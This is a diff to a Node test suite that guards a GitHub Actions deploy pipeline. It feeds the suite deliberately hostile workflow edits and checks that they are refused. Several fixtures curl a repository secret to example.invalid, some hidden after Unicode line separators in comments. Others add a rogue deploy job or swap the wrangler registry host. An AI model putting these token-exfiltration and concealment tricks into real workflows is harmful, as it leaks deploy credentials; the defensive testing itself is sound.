@@ -1,19 +1,35 @@
 import { strict as assert } from 'node:assert';
-import { existsSync, readFileSync } from 'node:fs';
+import { execFileSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
-import { describe, it } from 'node:test';
+import { after, describe, it } from 'node:test';
 import { fileURLToPath } from 'node:url';
 import {
     ACTIONS,
+    CI_RULES,
+    HOOK_RULES,
+    NPM_REGISTRY,
     PINNED_USES,
+    PNPM_PACKAGE_MANAGER,
+    PNPM_PACKAGE_MANAGER_SHA512,
     PRODUCTION_RELEASE_SENTENCE,
     PUBLIC_CHECK_TESTS,
     PUBLIC_CHECKS_RUN,
     RULES,
+    SKIPS,
     UNWRAP_RUN,
+    WORKFLOW_FILES,
+    WRANGLER_RULES,
+    ciProblems,
     parseWorkflow,
+    pnpmHookProblems,
+    trackedPathsAt,
     usesOf,
+    workflowFilesAt,
+    workflowFilesProblems,
     workflowProblems,
+    wranglerProblems,
 } from './deploy-workflow-lib.mjs';
 import { PACK_SCRIPT, PIN_SCRIPT } from './looks-artifact.mjs';
 import { CANARY_TREE, publicLookFacts } from './private-looks.mjs';
@@ -51,6 +67,15 @@ const DOWNLOAD = usesOf(ACTIONS.download);
 const PREVIEW_GATE = "    if: github.ref == 'refs/heads/main' && inputs.target == 'preview'\n";
 const PRODUCTION_GATE = "    if: github.ref == 'refs/heads/main' && inputs.target == 'production'\n";
 const RUN_TESTS = '      - run: pnpm test\n';
+const INSTALL_STEP = '      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n';
+const INSTALL_DEPLOY_STEP = '      - run: pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile\n';
+/** The characters a YAML reader takes for a line break that a split on `\n` does not (the 8c3 critic's item 1), and a C1 control. */
+const LS = '\u2028';
+const PS = '\u2029';
+const NEL = '\u0085';
+const CSI = '\u009b';
+/** The word a skipped test is written with, put together so this file holds none of the shapes `SKIPS` refuses. */
+const SKIP = ['sk', 'ip'].join('');
 const UNWRAP_STEP = `      - run: ${UNWRAP_RUN}\n`;
 const PRIVATE_FETCH = '          fetch-depth: 1\n';
 
@@ -115,6 +140,28 @@ const PLANTS = [
     ['a run: |- that strips its last newline', 'grammar', inJobEdit('deploy-preview', '        run: |\n', '        run: |-\n')],
     ['a tag', 'grammar', inJobEdit('public-checks', '          persist-credentials: false\n', '          persist-credentials: !!bool false\n')],
     ['a tab', 'grammar', inJobEdit('build-production', '    runs-on: ubuntu-latest\n', '    runs-on:\tubuntu-latest\n')],
+    [
+        'the 8c3 critic’s edit (a): a step reading the read token, hidden after a U+2028 in a comment of the looks job',
+        'grammar',
+        inJobEdit(
+            'looks',
+            '      # One commit, no history, no credential left behind. The checkout\n',
+            `      # One commit, no history, no credential left behind. The checkout${LS}      - env:${LS}          T: ${ex('secrets.LOOKS_READ_TOKEN')}${LS}        run: curl -sd "$T" https://example.invalid\n`,
+        ),
+    ],
+    [
+        'the 8c3 critic’s edit (b): a seventh job deploying to main with the preview token, hidden after a U+0085 in a comment',
+        'grammar',
+        edit(
+            "  # Waits for the owner's review in the `production` Environment. Approve\n",
+            `  # Waits for the owner's review in the \`production\` Environment. Approve${NEL}  sneak:${NEL}    needs: build-production${NEL}    runs-on: ubuntu-latest${NEL}    environment: cloudflare${NEL}    steps:${NEL}      - uses: actions/checkout@v5${NEL}      - env:${NEL}          CLOUDFLARE_API_TOKEN: ${ex('secrets.CLOUDFLARE_API_TOKEN')}${NEL}        run: npx wrangler pages deploy . --branch main\n`,
+        ),
+    ],
+    ['a U+2029 in a comment', 'grammar', inJobEdit('public-checks', "      # The whole history: the canary's recipe reads its bytes at the\n", `      # The whole history: the canary's recipe reads its bytes at the${PS}\n`)],
+    ['a U+2028 alone in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${LS} three Environments,`)],
+    ['a U+0085 alone in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${NEL} three Environments,`)],
+    ['a C1 control in a comment', 'grammar', edit('# Six jobs, three Environments,', `# Six jobs,${CSI} three Environments,`)],
+    ['a non-ASCII character in a comment', 'grammar', edit('# Six jobs, three Environments,', '# Six jobs \u2014 three Environments,')],
     ['a comment after a run: value', 'grammar', inJobEdit('build-preview', RUN_TESTS, '      - run: pnpm test # || true\n')],
     ['a document marker', 'grammar', (text) => `---\n${text}`],
     ['a zero-width space in a value', 'grammar', inJobEdit('deploy-preview', '    environment: cloudflare\n', '    environment: cloud\u200bflare\n')],
@@ -280,7 +327,7 @@ const PLANTS = [
     ['STALL_LOOKS_DIR on public-checks', 'selection', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - run: ${PUBLIC_CHECKS_RUN}\n        env:\n          STALL_LOOKS_DIR: looks\n`)],
 
     // unwrap-first
-    ['the unwrap after the install', 'unwrap-first', pipe(inJobEdit('build-preview', UNWRAP_STEP, ''), inJobEdit('build-preview', '      - run: pnpm install --frozen-lockfile\n', `      - run: pnpm install --frozen-lockfile\n${UNWRAP_STEP}`))],
+    ['the unwrap after the install', 'unwrap-first', pipe(inJobEdit('build-preview', UNWRAP_STEP, ''), inJobEdit('build-preview', INSTALL_STEP, `${INSTALL_STEP}${UNWRAP_STEP}`))],
     ['the unwrap before the download', 'unwrap-first', pipe(inJobEdit('build-preview', UNWRAP_STEP, ''), inJobEdit('build-preview', `      - uses: ${DOWNLOAD}\n`, `${UNWRAP_STEP}      - uses: ${DOWNLOAD}\n`))],
     ['no unwrap', 'unwrap-first', inJobEdit('build-preview', UNWRAP_STEP, '')],
     ['an unwrap in build-production', 'unwrap-first', inJobEdit('build-production', '      - run: corepack enable && corepack prepare --activate\n', `${UNWRAP_STEP}      - run: corepack enable && corepack prepare --activate\n`)],
@@ -306,6 +353,13 @@ const PLANTS = [
     ['the production call without --branch', 'deploy', inJobEdit('deploy-production', '--branch main ', '')],
     ['pnpm build in the production deploy', 'deploy', inJobEdit('deploy-production', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n      - run: pnpm build\n')],
     ['wrangler in build-production', 'deploy', inJobEdit('build-production', RUN_TESTS, `${RUN_TESTS}      - run: pnpm exec wrangler --version\n`)],
+
+    // installs
+    ['the preview deploy’s install loading pnpm’s hook', 'installs', inJobEdit('deploy-preview', INSTALL_DEPLOY_STEP, '      - run: pnpm install --frozen-lockfile --ignore-scripts\n')],
+    ['the production deploy’s npm ci running package scripts', 'installs', inJobEdit('deploy-production', '      - run: npm ci --prefix deploy --ignore-scripts --no-audit --no-fund\n', '      - run: npm ci --prefix deploy --no-audit --no-fund\n')],
+    ['the production deploy’s pnpm install running package scripts', 'installs', inJobEdit('deploy-production', INSTALL_DEPLOY_STEP, '      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n')],
+    ['build-production’s install loading pnpm’s hook', 'installs', inJobEdit('build-production', INSTALL_STEP, '      - run: pnpm install --frozen-lockfile\n')],
+    ['a pnpm call in a deploy job that would load the hook', 'installs', inJobEdit('deploy-preview', INSTALL_DEPLOY_STEP, `${INSTALL_DEPLOY_STEP}      - run: pnpm --version --ignore-scripts\n`)],
 
     // credentials
     ['a checkout that keeps its credential', 'credentials', inJobEdit('deploy-preview', `      - uses: ${CHECKOUT}\n        with:\n          persist-credentials: false\n`, `      - uses: ${CHECKOUT}\n`)],
@@ -361,6 +415,42 @@ const PLANTS = [
         'public-checks',
         (text) => text,
         { sources: { ...SOURCES, 'scripts/looks-pin.test.mjs': SOURCES['scripts/looks-pin.test.mjs'].replace("\n    it('", `\n    ${['it', 'skip'].join('.')}('`) } },
+    ],
+    [
+        'a { timeout, skip } option in the canary’s suite (the 8c3 critic’s item 4)',
+        'public-checks',
+        (text) => text,
+        {
+            sources: {
+                ...SOURCES,
+                'scripts/looks-artifact.test.mjs': once(
+                    SOURCES['scripts/looks-artifact.test.mjs'],
+                    "    it('is the literal, pinned by value, made from a full commit', () => {\n",
+                    `    it('is the literal, pinned by value, made from a full commit', { timeout: 60_000, ${SKIP}: !process.env.STALL_STRICT }, () => {\n`,
+                ),
+            },
+        },
+    ],
+    [
+        'a t.<skip>() call inside the canary’s suite',
+        'public-checks',
+        (text) => text,
+        {
+            sources: {
+                ...SOURCES,
+                'scripts/looks-artifact.test.mjs': once(
+                    SOURCES['scripts/looks-artifact.test.mjs'],
+                    "    it('is the tree the tracked pin names', () => {\n",
+                    `    it('is the tree the tracked pin names', (t) => {\n        if (!process.env.STALL_STRICT) return t.${SKIP}('not strict');\n`,
+                ),
+            },
+        },
+    ],
+    [
+        'an only option in the pin’s suite',
+        'public-checks',
+        (text) => text,
+        { sources: { ...SOURCES, 'scripts/looks-pin.test.mjs': SOURCES['scripts/looks-pin.test.mjs'].replace("\n    it('", `\n    it({ ${['on', 'ly'].join('')}: true }, '`) } },
     ],
     ['a file public-checks runs, not read', 'public-checks', (text) => text, { sources: { 'scripts/deploy-workflow.test.mjs': SOURCES['scripts/deploy-workflow.test.mjs'] } }],
     ['the looks job no longer waiting for public-checks (the third 8c2 critic’s item 1)', 'public-checks', inJobEdit('looks', '    needs: public-checks\n', '')],
@@ -464,7 +554,7 @@ describe('the-deploy-workflow-pins-every-action-by-commit', () => {
     });
 
     it('writes every uses: line of the file as one of them, at a full 40-hex commit with its version beside it — read off the raw text, no placeholder and no tag', () => {
-        const lines = TEXT.split('\n').filter((line) => /^\s*-?\s*uses:/.test(line));
+        const lines = TEXT.split(/\r\n|[\n\r\u0085\u2028\u2029]/).filter((line) => /^\s*-?\s*uses:/.test(line));
         assert.ok(lines.length >= 6);
         for (const line of lines) {
             const value = line.replace(/^\s*-?\s*uses:\s*/, '');
@@ -479,19 +569,276 @@ describe('the-deploy-workflow-pins-every-action-by-commit', () => {
     });
 });
 
+/** A throwaway repository, never this checkout: git with no global or system config, removed after this file. */
+const SCRATCH = mkdtempSync(join(tmpdir(), 'deploy-workflow-'));
+after(() => rmSync(SCRATCH, { recursive: true, force: true }));
+let planted = 0;
+const GIT_ENV = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' };
+for (const name of ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_COMMON_DIR']) {
+    delete GIT_ENV[name];
+}
+
+/** A repository whose `files` (`{ path: text }`) are on the disk, `tracked` of them added to its index, and `gone` of them then taken off the disk. */
+function plantRepo(files, { tracked = Object.keys(files), gone = [] } = {}) {
+    planted += 1;
+    const dir = join(SCRATCH, `repo-${planted}`);
+    mkdirSync(dir);
+    const git = (...args) => execFileSync('git', ['-C', dir, ...args], { env: GIT_ENV, stdio: ['ignore', 'pipe', 'pipe'] });
+    git('init', '-q');
+    for (const [path, text] of Object.entries(files)) {
+        mkdirSync(dirname(join(dir, path)), { recursive: true });
+        writeFileSync(join(dir, path), text);
+    }
+    if (tracked.length > 0) {
+        git('add', '--', ...tracked);
+    }
+    for (const path of gone) {
+        unlinkSync(join(dir, path));
+    }
+    return dir;
+}
+
+const CI_TEXT = readFileSync(join(ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
+const WORKFLOWS = { '.github/workflows/ci.yml': CI_TEXT, '.github/workflows/deploy.yml': TEXT };
+
+/** The 8c3 critic's third workflow file: on a push to main, the looks Environment, its read token handed to curl. */
+const TIDY = `name: tidy\non:\n  push:\n    branches:\n      - main\njobs:\n  tidy:\n    runs-on: ubuntu-latest\n    environment: looks\n    steps:\n      - env:\n          T: ${ex('secrets.LOOKS_READ_TOKEN')}\n        run: curl -sd "$T" https://example.invalid\n`;
+
+/*
+ * The 8c3 critic's item 2: an Environment's branch rule admits every
+ * workflow file whose run is on `main`, whatever its trigger, so a third
+ * file would hand out the read token, the preview token, or a review prompt
+ * for a job the owner does not expect — with no dispatch at all, on a push.
+ * The directory holds ci.yml and deploy.yml alone, tracked and on the disk;
+ * the reader (`workflowFilesAt`) is run on this checkout and on planted
+ * repositories.
+ */
+describe('the-workflow-directory-holds-ci-and-deploy-alone', () => {
+    it('holds ci.yml and deploy.yml alone here, tracked and on the disk', () => {
+        const here = workflowFilesAt(ROOT);
+        assert.deepEqual(here, { tracked: [...WORKFLOW_FILES], disk: [...WORKFLOW_FILES] });
+        assert.deepEqual(workflowFilesProblems(here), []);
+        assert.deepEqual(workflowFilesProblems(workflowFilesAt(plantRepo(WORKFLOWS))), [], 'the positive control: the two files alone, planted');
+    });
+
+    const PLANTS_DIR = [
+        ['the 8c3 critic’s tidy.yml, tracked and on the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, {}],
+        ['tidy.yml on the disk, not tracked', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { tracked: Object.keys(WORKFLOWS) }],
+        ['tidy.yml tracked, gone from the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { gone: ['.github/workflows/tidy.yml'] }],
+        ['a .yaml file beside them', { ...WORKFLOWS, '.github/workflows/tidy.yaml': TIDY }, {}],
+        ['a file in a subdirectory', { ...WORKFLOWS, '.github/workflows/more/tidy.yml': TIDY }, {}],
+        ['ci.yml gone', { '.github/workflows/deploy.yml': TEXT }, {}],
+    ];
+    for (const [name, files, how] of PLANTS_DIR) {
+        it(`refuses ${name} (workflow-files)`, () => {
+            const problems = workflowFilesProblems(workflowFilesAt(plantRepo(files, how)));
+            assert.ok(
+                problems.some((problem) => problem.rule === 'workflow-files'),
+                JSON.stringify(problems),
+            );
+        });
+    }
+});
+
+/** Each ci.yml plant: what it is, the rule it must yield, the edit. */
+const CI_PLANTS = [
+    ['a U+2028 in a comment hiding environment: looks', 'grammar', (text) => once(text, '  build-and-test:\n', `  build-and-test:\n    # note${LS}    environment: looks\n`)],
+    ['branches: [main] as a flow sequence', 'grammar', (text) => once(text, '    branches:\n      - main\n', '    branches: [main]\n')],
+    ['a non-ASCII character in a comment', 'grammar', (text) => once(text, '# The gate AGENTS.md section 4', '# The gate AGENTS.md §4')],
+    ['a pull_request_target trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n')],
+    ['a workflow_run trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  workflow_run:\n')],
+    ['a workflow_call trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  workflow_call:\n')],
+    ['the 8c3 critic’s first line: environment: looks on build-and-test', 'ci-environment', (text) => once(text, '  build-and-test:\n    runs-on: ubuntu-latest\n', '  build-and-test:\n    runs-on: ubuntu-latest\n    environment: looks\n')],
+    [
+        'the 8c3 critic’s second line: a step curling the read token',
+        'ci-secrets',
+        (text) => once(text, '      - run: pnpm test\n', `      - run: pnpm test\n      - run: curl -sd "$T" https://example.invalid\n        env:\n          T: ${ex('secrets.LOOKS_READ_TOKEN')}\n`),
+    ],
+    ['secrets: inherit on a job', 'ci-secrets', (text) => once(text, '  build-and-test:\n    runs-on: ubuntu-latest\n', '  build-and-test:\n    runs-on: ubuntu-latest\n    secrets: inherit\n')],
+    ['contents: write', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n', 'permissions:\n  contents: write\n')],
+    ['id-token: write beside contents: read', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n')],
+    ['permissions: write-all on the layout job', 'ci-permissions', (text) => once(text, '  layout:\n', '  layout:\n    permissions: write-all\n')],
+    ['no permissions at all (the repository default)', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n\n', '')],
+    ['an install that loads pnpm’s hook', 'ci-installs', (text) => once(text, 'jobs:\n  build-and-test:', 'jobs:\n  build-and-test:').replace('      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n', '      - run: pnpm install --frozen-lockfile\n')],
+];
+
+/*
+ * The 8c3 critic's item 2, ci.yml's half: it runs on every push to `main`,
+ * so it is read under the same closed grammar as deploy.yml and holds no
+ * key: no trigger but push, pull_request and workflow_dispatch, no
+ * Environment, no secret, a token that reads and nothing more — and its
+ * installs skip pnpm's hook file, as the deploy road's do. Each rule
+ * planted; `ciProblems` documents why the file is not pinned whole.
+ */
+describe('the-ci-workflow-holds-no-key', () => {
+    it('reads the real ci.yml as breaking no rule', () => {
+        assert.deepEqual(ciProblems(CI_TEXT), []);
+    });
+
+    for (const [name, rule, plant] of CI_PLANTS) {
+        it(`refuses ${name} (${rule})`, () => {
+            const text = plant(CI_TEXT);
+            assert.notEqual(text, CI_TEXT, 'the plant changed nothing');
+            const problems = ciProblems(text);
+            assert.ok(
+                problems.some((problem) => problem.rule === rule),
+                `no ${rule} problem among: ${JSON.stringify(problems.map((problem) => problem.rule))}`,
+            );
+        });
+    }
+
+    it('refuses the critic’s two lines together, each by its own rule', () => {
+        const both = CI_PLANTS[7][2](CI_PLANTS[6][2](CI_TEXT));
+        const rules = new Set(ciProblems(both).map((problem) => problem.rule));
+        assert.ok(rules.has('ci-environment') && rules.has('ci-secrets'), [...rules].join(', '));
+    });
+
+    it('plants every rule, and names no rule the reader does not hold', () => {
+        assert.deepEqual([...CI_RULES].sort(), [...new Set(CI_PLANTS.map(([, rule]) => rule))].sort());
+    });
+});
+
+const TRACKED = trackedPathsAt(ROOT);
+const readTracked = (path) => readFileSync(join(ROOT, path), 'utf8');
+/** `read` with `over` (`{ path: text }`) standing in for those files. */
+const readWith = (over) => (path) => (Object.prototype.hasOwnProperty.call(over, path) ? over[path] : readTracked(path));
+const ROOT_PKG = readTracked('package.json');
+const withPackageManager = (value) => once(ROOT_PKG, `"packageManager": "${PNPM_PACKAGE_MANAGER}"`, `"packageManager": ${JSON.stringify(value)}`);
+const HASH = 'ab'.repeat(64);
+
+/** Each hook plant: what it is, the rule it must yield, the tracked paths, the files read in their place, the hash pinned. */
+const HOOK_PLANTS = [
+    ['a .pnpmfile.cjs tracked at the root', 'hook-file', [...TRACKED, '.pnpmfile.cjs'], { '.pnpmfile.cjs': 'module.exports = { hooks: {} };\n' }],
+    ['a .pnpmfile.mjs tracked in deploy/', 'hook-file', [...TRACKED, 'deploy/.pnpmfile.mjs'], { 'deploy/.pnpmfile.mjs': 'export const hooks = {};\n' }],
+    ['a pnpmfile.js in worker-icons/', 'hook-file', [...TRACKED, 'worker-icons/pnpmfile.js'], { 'worker-icons/pnpmfile.js': '' }],
+    ['pnpmfile= in a tracked .npmrc', 'hook-settings', [...TRACKED, '.npmrc'], { '.npmrc': 'pnpmfile=./scripts/hook.cjs\n' }],
+    ['global-pnpmfile= in deploy/.npmrc', 'hook-settings', [...TRACKED, 'deploy/.npmrc'], { 'deploy/.npmrc': 'global-pnpmfile=/tmp/h.cjs\n' }],
+    ['configDependencies in pnpm-workspace.yaml', 'hook-settings', TRACKED, { 'pnpm-workspace.yaml': `${readTracked('pnpm-workspace.yaml')}configDependencies:\n  hooks: 1.0.0+sha512-x\n` }],
+    ['pnpmfile in pnpm-workspace.yaml', 'hook-settings', TRACKED, { 'pnpm-workspace.yaml': `${readTracked('pnpm-workspace.yaml')}pnpmfile: scripts/hook.cjs\n` }],
+    ['configDependencies in package.json’s pnpm field', 'hook-settings', TRACKED, { 'package.json': once(ROOT_PKG, '"pnpm": {', '"pnpm": {\n    "configDependencies": {},') }],
+    ['another pnpm version', 'package-manager', TRACKED, { 'package.json': withPackageManager('pnpm@10.24.1') }],
+    ['pnpm from a URL', 'package-manager', TRACKED, { 'package.json': withPackageManager('pnpm@https://example.invalid/pnpm.tgz') }],
+    ['a hash that is not 128 hex', 'package-manager', TRACKED, { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.abc`) }],
+    ['no packageManager', 'package-manager', TRACKED, { 'package.json': once(ROOT_PKG, `  "packageManager": "${PNPM_PACKAGE_MANAGER}",\n`, '') }],
+    ['the hash left out once one is pinned', 'package-manager', TRACKED, {}, HASH],
+    ['another hash than the pinned one', 'package-manager', TRACKED, { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.${'cd'.repeat(64)}`) }, HASH],
+    ['no package.json tracked at the root', 'package-manager', TRACKED.filter((path) => path !== 'package.json'), {}],
+    ['a packageManager in deploy/package.json', 'package-manager', TRACKED, { 'deploy/package.json': readTracked('deploy/package.json').replace('{', '{\n  "packageManager": "npm@10.0.0",') }],
+];
+
+/*
+ * The 8c3 critic's item 3: `pnpm install --ignore-scripts` still loads
+ * `.pnpmfile.cjs` (measured on pnpm 10.24.0, offline; and again by this
+ * step's builder: a hook's marker written without `--ignore-pnpmfile`, not
+ * with it), and corepack runs `packageManager` as pnpm before any install.
+ * So every install in both workflow files carries `--ignore-pnpmfile`
+ * (rules `installs` and `ci-installs`), and the tracked tree holds no hook,
+ * names none, and pins pnpm: `pnpm@10.24.0`, with its `+sha512.` hash
+ * accepted beside it and, once `PNPM_PACKAGE_MANAGER_SHA512` is set after
+ * the owner's yes for one registry lookup, required.
+ */
+describe('no-install-loads-a-pnpm-hook', () => {
+    it('reads the tracked tree as loading no hook, and pins pnpm by value', () => {
+        assert.deepEqual(pnpmHookProblems({ paths: TRACKED, read: readTracked }), []);
+        assert.equal(PNPM_PACKAGE_MANAGER, 'pnpm@10.24.0');
+        assert.equal(PNPM_PACKAGE_MANAGER_SHA512, undefined, 'the hash waits for one registry lookup and the owner’s yes');
+        assert.equal(JSON.parse(ROOT_PKG).packageManager, PNPM_PACKAGE_MANAGER);
+    });
+
+    it('accepts a +sha512 hash beside the version while none is pinned, and the pinned one once it is', () => {
+        const hashed = { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.${HASH}`) };
+        assert.deepEqual(pnpmHookProblems({ paths: TRACKED, read: readWith(hashed) }), []);
+        assert.deepEqual(pnpmHookProblems({ paths: TRACKED, read: readWith(hashed), sha512: HASH }), []);
+    });
+
+    it('carries --ignore-pnpmfile on every pnpm install of both workflow files', () => {
+        for (const text of [TEXT, CI_TEXT]) {
+            const installs = text.split('\n').filter((line) => /\bpnpm install\b/.test(line) && !/^\s*#/.test(line));
+            assert.ok(installs.length >= 2);
+            for (const line of installs) {
+                assert.ok(line.includes('--ignore-pnpmfile'), line);
+            }
+        }
+    });
+
+    for (const [name, rule, paths, over, sha512] of HOOK_PLANTS) {
+        it(`refuses ${name} (${rule})`, () => {
+            const problems = pnpmHookProblems({ paths, read: readWith(over), ...(sha512 === undefined ? {} : { sha512 }) });
+            assert.ok(
+                problems.some((problem) => problem.rule === rule),
+                `no ${rule} problem among: ${JSON.stringify(problems)}`,
+            );
+        });
+    }
+
+    it('sees a hook file tracked in a planted repository, through the reader', () => {
+        const dir = plantRepo({ 'package.json': ROOT_PKG, '.pnpmfile.cjs': 'module.exports = {};\n' });
+        const paths = trackedPathsAt(dir);
+        assert.deepEqual(paths, ['.pnpmfile.cjs', 'package.json']);
+        assert.ok(pnpmHookProblems({ paths, read: (path) => readFileSync(join(dir, path), 'utf8') }).some((problem) => problem.rule === 'hook-file'));
+    });
+
+    it('plants every rule, and names no rule the reader does not hold', () => {
+        assert.deepEqual([...HOOK_RULES].sort(), [...new Set(HOOK_PLANTS.map(([, rule]) => rule))].sort());
+    });
+});
+
+const DEPLOY_PKG = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package.json'), 'utf8'));
+const DEPLOY_LOCK = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package-lock.json'), 'utf8'));
+const WRANGLER_FACTS = {
+    pkg: DEPLOY_PKG,
+    lock: DEPLOY_LOCK,
+    rootPkg: JSON.parse(ROOT_PKG),
+    rootNames: readdirSync(ROOT),
+    deployNames: readdirSync(join(ROOT, 'deploy')),
+};
+/** The lockfile with one package's entry edited. */
+const lockWith = (key, change) => ({ ...DEPLOY_LOCK, packages: { ...DEPLOY_LOCK.packages, [key]: change({ ...DEPLOY_LOCK.packages[key] }) } });
+const ANOTHER = Object.keys(DEPLOY_LOCK.packages).find((key) => key !== '' && key !== 'node_modules/wrangler');
+
+/** Each wrangler plant: what it is, the rule it must yield, the facts it changes. */
+const WRANGLER_PLANTS = [
+    ['wrangler by a range', 'wrangler-pin', { pkg: { ...DEPLOY_PKG, devDependencies: { ...DEPLOY_PKG.devDependencies, wrangler: `^${DEPLOY_PKG.devDependencies.wrangler}` } } }],
+    ['the lockfile at another wrangler', 'wrangler-pin', { lock: lockWith('node_modules/wrangler', (entry) => ({ ...entry, version: '0.0.1' })) }],
+    ['wrangler in the root devDependencies', 'wrangler-root', { rootPkg: { ...JSON.parse(ROOT_PKG), devDependencies: { ...JSON.parse(ROOT_PKG).devDependencies, wrangler: '4.0.0' } } }],
+    ['a wrangler.toml at the root', 'wrangler-root', { rootNames: [...WRANGLER_FACTS.rootNames, 'wrangler.toml'] }],
+    [
+        'the 8c3 critic’s edit: wrangler from another host, its integrity changed',
+        'wrangler-registry',
+        { lock: lockWith('node_modules/wrangler', (entry) => ({ ...entry, resolved: 'https://example.invalid/wrangler/-/wrangler-4.143.0.tgz', integrity: `sha512-${'A'.repeat(86)}==` })) },
+    ],
+    ['a package from a registry-looking host', 'wrangler-registry', { lock: lockWith(ANOTHER, (entry) => ({ ...entry, resolved: entry.resolved.replace(NPM_REGISTRY, 'https://registry.npmjs.org.example.invalid/') })) }],
+    ['a package with no resolved', 'wrangler-registry', { lock: lockWith(ANOTHER, ({ resolved, ...entry }) => entry) }],
+    ['a lockfile that lists no package', 'wrangler-registry', { lock: { ...DEPLOY_LOCK, packages: { '': DEPLOY_LOCK.packages[''] } } }],
+    ['a package with no integrity', 'wrangler-integrity', { lock: lockWith(ANOTHER, ({ integrity, ...entry }) => entry) }],
+    ['a package with a sha1 integrity', 'wrangler-integrity', { lock: lockWith(ANOTHER, (entry) => ({ ...entry, integrity: `sha1-${'A'.repeat(27)}=` })) }],
+    ['a deploy/.npmrc', 'wrangler-npmrc', { deployNames: [...WRANGLER_FACTS.deployNames, '.npmrc'] }],
+];
+
+/*
+ * wrangler is the one package that runs holding a Cloudflare token, so its
+ * install is held whole: one exact version in deploy/'s package and
+ * lockfile, never at the root and no wrangler config there to steer it
+ * (7B-1), and — the 8c3 critic's item 5 — every package of the lockfile
+ * from the npm registry with a sha512 integrity, and no deploy/.npmrc.
+ */
 describe('the-deploy-workflow-takes-wrangler-from-its-own-pinned-package', () => {
-    it('pins wrangler exactly in deploy/, in its package and its lockfile, and never at the root', () => {
-        const pkg = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package.json'), 'utf8'));
-        const lock = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package-lock.json'), 'utf8'));
-        const version = pkg.devDependencies?.wrangler;
-        assert.match(version ?? '', /^\d+\.\d+\.\d+$/, 'wrangler is pinned exactly');
-        assert.equal(lock.packages?.['node_modules/wrangler']?.version, version);
-        const root = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
-        for (const field of ['dependencies', 'devDependencies', 'optionalDependencies']) {
-            assert.equal(root[field]?.wrangler, undefined, `no wrangler in the root ${field}`);
-        }
-        for (const name of ['wrangler.toml', 'wrangler.json', 'wrangler.jsonc']) {
-            assert.equal(existsSync(join(ROOT, name)), false, `no ${name} at the root`);
-        }
+    it('reads deploy/ as breaking no rule', () => {
+        assert.deepEqual(wranglerProblems(WRANGLER_FACTS), []);
+        assert.equal(NPM_REGISTRY, 'https://registry.npmjs.org/');
+    });
+
+    for (const [name, rule, over] of WRANGLER_PLANTS) {
+        it(`refuses ${name} (${rule})`, () => {
+            const problems = wranglerProblems({ ...WRANGLER_FACTS, ...over });
+            assert.ok(
+                problems.some((problem) => problem.rule === rule),
+                `no ${rule} problem among: ${JSON.stringify(problems.map((problem) => problem.rule))}`,
+            );
+        });
+    }
+
+    it('plants every rule, and names no rule the reader does not hold', () => {
+        assert.deepEqual([...WRANGLER_RULES].sort(), [...new Set(WRANGLER_PLANTS.map(([, rule]) => rule))].sort());
     });
 });
